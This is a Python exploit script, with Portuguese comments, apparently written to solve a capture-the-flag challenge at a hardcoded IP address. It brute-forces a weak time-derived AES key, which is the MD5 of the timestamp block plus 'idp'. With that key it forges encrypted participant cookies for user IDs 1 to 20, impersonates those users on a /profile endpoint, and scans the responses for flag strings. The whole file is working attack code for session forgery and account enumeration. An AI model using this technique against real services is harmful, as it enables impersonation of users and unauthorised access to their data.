#!/usr/bin/env python3
# find_flag.py
# Brute-force safe: encontra tb válido e testa user_id 1..N no /profile
import time, json, base64, requests
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

HOST = "http://20.102.93.39:33250"
API_PATH = "/api"
PROFILE_PATH = "/profile"

WINDOW_MS = 5000

# payload usado para testar timestamp (mesmo do register)
TEST_PAYLOAD = {
    "action": "registrar_participacao",
    "participant": {"username":"probe","email":"probe@example.com","info":""}
}

def time_block_of(ts_ms):
    return ts_ms // WINDOW_MS

def derive_key_bytes(tb):
    return md5((str(tb)+"idp").encode()).digest()

def aes_cbc_encrypt_b64(key_bytes, plaintext_bytes):
    iv = get_random_bytes(16)
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
    return base64.b64encode(ct).decode(), base64.b64encode(iv).decode()

def aes_cbc_decrypt_bytes(key_bytes, ct_b64, iv_b64):
    ct = base64.b64decode(ct_b64)
    iv = base64.b64decode(iv_b64)
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt

def try_tb(tb):
    key = derive_key_bytes(tb)
    payload_json = json.dumps(TEST_PAYLOAD, separators=(',',':')).encode()
    ct_b64, iv_b64 = aes_cbc_encrypt_b64(key, payload_json)
    body = {"data": ct_b64, "iv": iv_b64, "timestamp": tb}
    try:
        r = requests.post(HOST + API_PATH, json=body, timeout=6)
        j = r.json()
    except Exception as e:
        return {"tb": tb, "error": str(e)}
    if "error" in j:
        return {"tb": tb, "error": j["error"]}
    if "data" in j and "iv" in j:
        # tenta decriptar para checar
        try:
            pt = aes_cbc_decrypt_bytes(key, j["data"], j["iv"])
            obj = json.loads(pt.decode())
            return {"tb": tb, "ok": True, "obj": obj, "resp": j}
        except Exception as e:
            return {"tb": tb, "ok": False, "decrypt_err": str(e), "resp": j}
    return {"tb": tb, "unknown_resp": j}

def find_valid_tb(center_tb=None, before=60, after=60):
    if center_tb is None:
        now_ms = int(time.time()*1000)
        center_tb = time_block_of(now_ms)
    print(f"[+] Scanning tb range {center_tb-before} .. {center_tb+after}")
    for tb in range(center_tb-before, center_tb+after+1):
        res = try_tb(tb)
        if res.get("ok"):
            print("[+] Valid tb found:", tb)
            return tb, res
        # opcional: print progresso mínimo
        if 'error' in res and res['error'] != "invalid_timestamp":
            print("  note:", tb, "->", res['error'])
    return None, None

def make_participant_cookie(tb, user_id):
    key = derive_key_bytes(tb)
    data_ct, data_iv = aes_cbc_encrypt_b64(key, str(user_id).encode())
    cookie_json = {"timestamp": tb, "iv": data_iv, "data": data_ct}
    return base64.b64encode(json.dumps(cookie_json, separators=(',',':')).encode()).decode()

def test_user_ids(tb, start=1, end=20):
    found = []
    for uid in range(start, end+1):
        cookie_val = make_participant_cookie(tb, uid)
        # faz GET /profile com cookie no header (requests)
        cookies = {"participant_cookie": cookie_val}
        try:
            r = requests.get(HOST + PROFILE_PATH, cookies=cookies, timeout=6)
            text = r.text
        except Exception as e:
            print("Request error for uid", uid, ":", e)
            continue
        # se a resposta contiver invalid_timestamp, pula
        if "invalid_timestamp" in text or "invalid timestamp" in text:
            print(f"uid={uid}: invalid_timestamp (rejected)")
            continue
        # procura por padrões comuns de flag (ex: IDP{)
        flag_hit = None
        for token in ["IDP{", "IDP{", "FLAG{", "flag{", "Idp{"]:
            if token in text:
                flag_hit = token
                break
        print(f"uid={uid}: response length {len(text)}", ("-- FLAG-LIKELY" if flag_hit else ""))
        if flag_hit or len(text) > 200: # se a página trouxe mais conteúdo, mostra snippet
            print("---- response snippet ----")
            print(text[:800])
            print("--------------------------")
        if flag_hit:
            found.append((uid, text))
        # pequeno atraso para não flood
        time.sleep(0.3)
    return found

if __name__ == "__main__":
    # você pode ajustar before/after para expandir busca
    # tenta com centro = seu relógio local
    center = None
    tb, res = find_valid_tb(center_tb=center, before=80, after=80)
    if not tb:
        print("Nenhum tb encontrado no range. Tente aumentar before/after ou sincronizar o relógio.")
        exit(1)
    print("server response example:", res.get("obj"))
    # agora testa user ids 1..20
    hits = test_user_ids(tb, start=1, end=20)
    if hits:
        print("POSSÍVEIS FLAGS / usuários interessantes encontrados:")
        for uid, txt in hits:
            print(" - uid", uid)
            # salva em arquivo
            open(f"profile_uid_{uid}.html","w",encoding="utf-8").write(txt)
        print("Arquivos salvos profile_uid_*.html")
    else:
        print("Nenhum conteúdo suspeito encontrado para user_id 1..20 com tb", tb)
